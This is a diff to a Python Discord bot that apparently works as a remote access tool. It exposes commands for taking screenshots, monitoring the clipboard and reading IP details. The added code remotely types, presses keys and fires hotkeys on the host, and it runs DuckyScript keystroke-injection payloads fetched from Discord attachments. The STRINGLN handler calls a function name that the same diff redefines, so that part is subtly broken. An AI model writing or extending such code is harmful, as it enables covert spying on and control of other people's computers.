@@ -24,7 +24,7 @@ class MyBot(commands.Bot):
         print(f"Logged in as: {self.user}")
         await self.add_cog(clipboard_monitor(bot))
 
-bot = MyBot(command_prefix="!", intents=intents)
+bot = MyBot(command_prefix="!", intents=intents, help_command=None)
 
 
 if system() == "Windows":
@@ -36,10 +36,9 @@ elif system() == "Linux":
 else:
     exit()
 
-
 # Standalone functions
 
-def embed_data(title, description, data, color):
+def embed_data(title, description="", data="", color=discord.Color.green()):
     if data:
         description += f"\n```{data}```"
         
@@ -49,6 +48,11 @@ def embed_data(title, description, data, color):
         description=description
     )
     return embed
+
+@bot.command(name="help")
+async def help(ctx):
+    embed = embed_data(title="Help menu", data=help_menu)
+    await ctx.send(embed=embed)
 
 
 # IP functions
@@ -102,6 +106,7 @@ def take_screenshot():
 
 @bot.command(name="screenshot")
 async def screenshot(ctx):
+
     image_path = take_screenshot()
     await ctx.send(file=discord.File(image_path))
 
@@ -145,7 +150,7 @@ class clipboard_monitor(commands.Cog):
     async def clipboard(self, ctx):
         await ctx.send("see help menu")
 
-    @clipboard.group(name="monitor", invoke_without_command=True)
+    @commands.group(name="monitor", invoke_without_command=True)
     async def monitor(self,ctx):
         await ctx.send("see help menu for monitor mode")
 
@@ -190,12 +195,85 @@ class clipboard_monitor(commands.Cog):
 
 # Keyboard functions
             
-def write(data, interval):
+def pyautogui_write(data, interval=0):
     pyautogui.write(data, interval=interval)
 
-@bot.command(name="keyboard")
-async def clipboard(ctx, arg):
-    write(arg, 0)
+def pyautogui_press(key):
+    pyautogui.press(key)
+
+def pyautogui_hotkey(hotkeys):
+    pyautogui.hotkey(hotkeys)
+
+async def parse_ducky_script(ducky_script):
+    file = ducky_script.splitlines()
+    for line in file:
+        split = line.split(" ")
+        args = []
+        for arg in split:
+            args.append(arg.replace("\n", ""))
+        print(args)
+
+        match args[0]:
+            case "REM":
+                pass
+
+            case "STRING":
+                text = " ".join(args[1:])
+                pyautogui_write(text)
+
+            case "STRINGLN":
+                text = " ".join(args[1:])
+                write(text)
+                await asyncio.sleep(0.2)
+                pyautogui_press("ENTER")
+
+            case "DELAY":
+                time = int(args[1]) / 1000
+                await asyncio.sleep(time)
+
+            case _:
+                hotkeys = []
+                for arg in args:
+                    hotkeys.append(arg.replace("GUI", "win"))
+                print(hotkeys)
+                pyautogui_hotkey(hotkeys)
+    print("done")
+
+@bot.group(name="keyboard", invoke_without_command=True)
+async def keyboard(ctx):
+    await ctx.send("see help menu")
+
+@keyboard.command(name="duckyscript")
+async def duckyscript(ctx):
+    attachment_url = ctx.message.attachments[0].url
+    file_contents = get(attachment_url)
+    file_contents_str = file_contents.content.decode("utf-8")
+    await parse_ducky_script(file_contents_str)
+    embed = embed_data(title="Duckyscript | Keyboard", description="Executed duckyscript:", data=file_contents_str, color=discord.Color.green())
+    await ctx.send(embed=embed)
+
+@keyboard.command(name="write")
+async def write(ctx, arg):
+    pyautogui_write(arg)
+    embed = embed_data(title="Write | Keyboard", description="Used keyboard to write:", data=arg)
+    await ctx.send(embed=embed)
+
+@keyboard.command(name="press")
+async def press(ctx, arg):
+    pyautogui_press(arg)
+    embed = embed_data(title="Press | Keyboard", description="Used keyboard to press:", data=arg)
+    await ctx.send(embed=embed)
+
+@keyboard.command(name="hotkey")
+async def hotkey(ctx, *args):
+    hotkeys = []
+    for arg in args:
+        hotkeys.append(arg.replace("GUI", "win"))
+    print(hotkeys)
+    pyautogui_hotkey(hotkeys)
+    embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
+    await ctx.send(embed=embed)
+
 
 # Running the bot
     
